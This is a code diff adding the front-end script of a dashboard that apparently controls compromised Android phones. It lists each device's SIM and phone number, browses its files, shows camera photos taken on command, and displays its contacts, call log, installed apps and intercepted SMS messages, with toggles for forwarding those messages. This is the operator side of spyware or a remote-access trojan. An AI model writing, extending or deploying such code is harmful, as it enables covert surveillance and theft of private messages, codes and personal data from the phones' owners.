+// ── SIM Info ────────────────────────────────────────────────────────────────
+async function loadSimInfo() {
+  if (!selectedDevice) return;
+  const data = await api(`/siminfo/${encodeURIComponent(selectedDevice)}`);
+  const el = document.getElementById('simInfoGrid');
+  if (!data || !data.length) {
+    el.innerHTML = '<div class="empty"><div class="empty-icon">📶</div>No SIM info yet. Will sync on next heartbeat.</div>';
+    return;
+  }
+  el.innerHTML = data.map(s => `
+    <div class="info-section">
+      <h4>SIM ${s.slot}</h4>
+      <div class="irow"><span>Carrier</span><strong>${esc(s.carrier||'—')}</strong></div>
+      <div class="irow"><span>Name</span><strong>${esc(s.display_name||'—')}</strong></div>
+      <div class="irow"><span>Number</span><strong>${esc(s.number||'—')}</strong></div>
+      <div class="irow"><span>Country</span><strong>${esc(s.country||'—').toUpperCase()}</strong></div>
+      <div class="irow"><span>Network</span><strong>${esc(s.network_type||'—')}</strong></div>
+      <div class="irow"><span>Roaming</span><strong style="color:${s.roaming?'var(--amber)':'var(--green)'}">${s.roaming?'Yes':'No'}</strong></div>
+      <div class="irow"><span>MCC/MNC</span><strong>${esc(s.mcc||'')}/${esc(s.mnc||'')}</strong></div>
+      <div class="irow"><span>ICC ID</span><strong style="font-size:9px">${esc(s.icc_id||'—')}</strong></div>
+    </div>`).join('');
+}
+
+// ── File Browser ──────────────────────────────────────────────────────────────
+async function browseFiles(path) {
+  if (!selectedDevice) return;
+  currentFilePath = path;
+  // First check cache
+  const cached = await api(`/files/${encodeURIComponent(selectedDevice)}?path=${encodeURIComponent(path)}`);
+  if (cached && cached.cached) {
+    renderFiles(path, cached.entries, cached.updated);
+  } else {
+    // Request fresh listing from device
+    await sendCmd('list_files', {path});
+    document.getElementById('fileList').innerHTML = '<div class="empty"><div class="empty-icon">⏳</div>Requesting from device... (~60s)</div>';
+    renderFilePath(path);
+  }
+}
+
+function renderFilePath(path) {
+  const segs = path.split('/').filter(Boolean);
+  let built = '';
+  const el = document.getElementById('filePath');
+  let html = `<span class="path-seg" onclick="browseFiles('/')">📁 /</span>`;
+  for (const seg of segs) {
+    built += '/' + seg;
+    const p = built;
+    html += ` / <span class="path-seg" onclick="browseFiles('${p}')">${esc(seg)}</span>`;
+  }
+  el.innerHTML = html;
+}
+
+function renderFiles(path, entries, updated) {
+  renderFilePath(path);
+  const el = document.getElementById('fileList');
+  if (!entries || !entries.length) {
+    el.innerHTML = '<div class="empty"><div class="empty-icon">📂</div>Empty folder</div>';
+    return;
+  }
+  el.innerHTML = entries.map(f => {
+    const icon = f.type==='dir' ? '📁' : getFileIcon(f.ext||'');
+    const size = f.type==='file' ? formatSize(f.size) : '';
+    const date = f.modified ? new Date(f.modified).toLocaleDateString() : '';
+    const onclick = f.type==='dir' ? `browseFiles('${esc(f.path)}')` : '';
+    return `
+    <div class="file-item" onclick="${onclick}">
+      <span class="file-icon">${icon}</span>
+      <span class="file-name">${esc(f.name)}</span>
+      <span class="file-size">${size}</span>
+      <span class="file-date">${date}</span>
+    </div>`;
+  }).join('');
+}
+
+function getFileIcon(ext) {
+  const img = ['jpg','jpeg','png','gif','webp','bmp','heic'];
+  const vid = ['mp4','mkv','avi','mov','wmv','3gp'];
+  const aud = ['mp3','wav','aac','m4a','ogg','flac'];
+  const doc = ['pdf','doc','docx','xls','xlsx','ppt','pptx','txt'];
+  const zip = ['zip','rar','7z','tar','gz'];
+  if (img.includes(ext)) return '🖼️';
+  if (vid.includes(ext)) return '🎬';
+  if (aud.includes(ext)) return '🎵';
+  if (doc.includes(ext)) return '📄';
+  if (zip.includes(ext)) return '🗜️';
+  if (ext==='apk') return '📦';
+  return '📄';
+}
+
+function formatSize(bytes) {
+  if (!bytes) return '';
+  if (bytes < 1024) return bytes+'B';
+  if (bytes < 1024*1024) return (bytes/1024).toFixed(1)+'KB';
+  if (bytes < 1024*1024*1024) return (bytes/1024/1024).toFixed(1)+'MB';
+  return (bytes/1024/1024/1024).toFixed(1)+'GB';
+}
+
+// ── Photos ────────────────────────────────────────────────────────────────────
+async function loadPhotos() {
+  if (!selectedDevice) return;
+  const photos = await api(`/photos/${encodeURIComponent(selectedDevice)}`);
+  const el = document.getElementById('photosGrid');
+  if (!photos || !photos.length) {
+    el.innerHTML = '<div class="empty"><div class="empty-icon">📷</div>No photos yet. Use the buttons above to take one.</div>';
+    return;
+  }
+  el.innerHTML = photos.map(p => `
+    <div class="photo-card" onclick="openPhoto('${esc(p.filename)}','${esc(p.camera)} · ${fmtTime(p.created_at)}')">
+      <img src="${API}/photo/${esc(p.filename)}?secret=${encodeURIComponent(SEC)}" alt="${esc(p.camera)}" loading="lazy" onerror="this.style.display='none'"/>
+      <div class="photo-meta">${esc(p.camera)} · ${fmtTime(p.created_at)}</div>
+    </div>`).join('');
+}
+
+function openPhoto(filename, caption) {
+  document.getElementById('photoModalTitle').textContent = caption;
+  document.getElementById('photoModalImg').src = `${API}/photo/${filename}?secret=${encodeURIComponent(SEC)}`;
+  document.getElementById('photoModal').classList.add('open');
+}
+
+// ── Contacts ──────────────────────────────────────────────────────────────────
+async function loadContacts() {
+  if (!selectedDevice) return;
+  const data = await api(`/contacts/${encodeURIComponent(selectedDevice)}`);
+  const tbody = document.getElementById('contactsTbody');
+  document.getElementById('contactCount').textContent = data ? `${data.length} contacts` : '';
+  if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="2" style="text-align:center;color:var(--muted)">No contacts synced yet</td></tr>'; return; }
+  tbody.innerHTML = data.map(c => `<tr><td>${esc(c.name)}</td><td>${esc(c.number)}</td></tr>`).join('');
+}
+
+// ── Call Log ──────────────────────────────────────────────────────────────────
+async function loadCallLog() {
+  if (!selectedDevice) return;
+  const data = await api(`/calllog/${encodeURIComponent(selectedDevice)}`);
+  const tbody = document.getElementById('calllogTbody');
+  document.getElementById('calllogCount').textContent = data ? `${data.length} entries` : '';
+  if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--muted)">No call log synced yet</td></tr>'; return; }
+  const icon = {incoming:'📲',outgoing:'📞',missed:'📵',unknown:'📞'};
+  tbody.innerHTML = data.map(c => {
+    const d = c.call_date ? new Date(c.call_date).toLocaleDateString('en-IN') : '';
+    const dur = c.duration > 0 ? `${c.duration}s` : '';
+    return `<tr><td>${esc(c.number)}</td><td>${esc(c.name||'')}</td><td>${(icon[c.type]||'📞')+' '+esc(c.type)}</td><td>${dur}</td><td>${d}</td></tr>`;
+  }).join('');
+}
+
+// ── Apps ──────────────────────────────────────────────────────────────────────
+async function loadApps() {
+  if (!selectedDevice) return;
+  const data = await api(`/apps/${encodeURIComponent(selectedDevice)}`);
+  const el = document.getElementById('appsList');
+  document.getElementById('appsCount').textContent = data ? `${data.length} apps installed` : '';
+  if (!data || !data.length) { el.innerHTML = '<div class="empty"><div class="empty-icon">📱</div>No apps synced yet</div>'; return; }
+  el.innerHTML = data.map(a => `<div style="background:var(--s2);border:1px solid var(--border);border-radius:6px;padding:5px 10px;font-size:12px">${esc(a)}</div>`).join('');
+}
+
+// ── Commands ──────────────────────────────────────────────────────────────────
+async function sendCmd(type, payload) {
+  if (!selectedDevice) return toast('Select a device first','err');
+  await sendCmdFor(selectedDevice, type, payload);
+}
+
+async function sendCmdFor(deviceId, type, payload) {
+  const r = await api('/commands', {method:'POST', body: JSON.stringify({device: deviceId, type, payload})});
+  if (r) toast(`✓ Command "${type}" queued`, 'ok');
+}
+
+// ── Global/Device toggles ─────────────────────────────────────────────────────
+async function onGlobal(el) {
+  const on = el.checked;
+  const r  = await api('/toggle/global?enabled='+on, {method:'POST'});
+  if (r) toast(on?'✓ Forwarding enabled':'Forwarding paused', on?'ok':'');
+  else el.checked = !on;
+}
+
+async function onDevToggle(el, dev) {
+  const on = el.checked;
+  const r  = await api(`/toggle/device?device=${encodeURIComponent(dev)}&enabled=${on}`, {method:'POST'});
+  if (r) toast(`${dev}: ${on?'enabled':'paused'}`, on?'ok':'');
+  else el.checked = !on;
+}
+
+// ── Feed & Logs ───────────────────────────────────────────────────────────────
+function renderFeed(msgs) {
+  const el = document.getElementById('feed');
+  if (!msgs.length) { el.innerHTML='<div class="empty"><div class="empty-icon">📭</div>No messages</div>'; return; }
+  el.innerHTML = msgs.map(m=>`
+    <div class="msg">
+      <div class="msg-icon">💬</div>
+      <div>
+        <div class="msg-sender">${esc(m.sender)}<span class="dev-tag">${esc(m.device)}</span></div>
+        <div class="msg-body">${esc(m.body)}</div>
+        <div class="msg-fwd ${m.forwarded?'ok':'fail'}">${m.forwarded?'✓ Forwarded':'○ Not forwarded'}</div>
+      </div>
+      <div class="msg-time">${fmtTime(m.received_at||m.created_at)}</div>
+    </div>`).join('');
+}
+
+function renderLogs(events) {
+  const el = document.getElementById('logsContainer');
+  if (!events.length) { el.innerHTML='<div class="empty"><div class="empty-icon">📋</div>No events</div>'; return; }
+  el.innerHTML = events.map(e=>`
+    <div class="log-item log-${esc(e.event)}">
+      <div class="log-ev">${esc(e.event)}</div>
+      <div><div class="log-detail">${esc(e.detail||'—')}</div><div class="log-dev">${esc(e.device)}</div></div>
+      <div class="log-time">${fmtTime(e.created_at)}</div>
+    </div>`).join('');
+}
+
+async function clearMsgs() {
+  if (!confirm('Clear all messages?')) return;
+  const r = await api('/messages', {method:'DELETE'});
+  if (r) { load(); toast('Cleared','ok'); }
+}
+
+// ── Modals ────────────────────────────────────────────────────────────────────
+function openRename() {
+  if (!selectedDevice) return;
+  const dev = (state.devices||[]).find(x=>x.device_id===selectedDevice);
+  document.getElementById('renameInput').value = dev?.display_name||'';
+  document.getElementById('renameModal').classList.add('open');
+}
+async function doRename() {
+  const name = document.getElementById('renameInput').value.trim();
+  if (!name) return;
+  const r = await api('/device/rename', {method:'POST', body: JSON.stringify({device_id:selectedDevice, new_name:name})});
+  if (r) { toast('Renamed ✓','ok'); closeModal('renameModal'); load(); }
+}
+function openSetPhone() {
+  if (!selectedDevice) return;
+  const dev = (state.devices||[]).find(x=>x.device_id===selectedDevice);
+  document.getElementById('phoneInput').value = dev?.phone_number||'';
+  document.getElementById('phoneModal').classList.add('open');
+}
+async function doSetPhone() {
+  const num = document.getElementById('phoneInput').value.trim();
+  const r = await api('/device/phone', {method:'POST', body: JSON.stringify({device_id:selectedDevice, phone_number:num})});
+  if (r) { toast('Saved ✓','ok'); closeModal('phoneModal'); load(); }
+}
+function closeModal(id) { document.getElementById(id).classList.remove('open'); }
+
+// ── Tabs ──────────────────────────────────────────────────────────────────────
+function showTab(name) {
+  ['devices','messages','logs'].forEach(t => {
+    document.getElementById('tab-'+t)?.classList.remove('active');
+    document.getElementById('pane-'+t).style.display = t===name?'block':'none';
+  });
+  document.getElementById('tab-'+name)?.classList.add('active');
+}
+
+// ── Utils ─────────────────────────────────────────────────────────────────────
+function timeAgo(ts) {
+  const d = new Date((ts||'').replace(' ','T')+'Z'); if(isNaN(d)) return ts||'—';
+  const s = Math.floor((Date.now()-d)/1000);
+  if(s<60) return s+'s ago'; if(s<3600) return Math.floor(s/60)+'m ago';
+  if(s<86400) return Math.floor(s/3600)+'h ago'; return Math.floor(s/86400)+'d ago';
+}
+function fmtTime(ts) {
+  const d = new Date((ts||'').replace(' ','T')+'Z'); if(isNaN(d)) return ts||'';
+  return d.toLocaleString('en-IN',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
+}
+function fmtDate(ts) {
+  const d = new Date((ts||'').replace(' ','T')+'Z'); if(isNaN(d)) return ts||'';
+  return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
+}
+function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function toast(msg,type='') {
+  const t=document.getElementById('toast'); t.textContent=msg; t.className='toast show '+(type||'');
+  setTimeout(()=>t.className='toast',3000);
+}
+
+if (SEC) load();
+setInterval(()=>{ if(SEC) load(); }, 30000);
+</script>
+</body>
+</html>
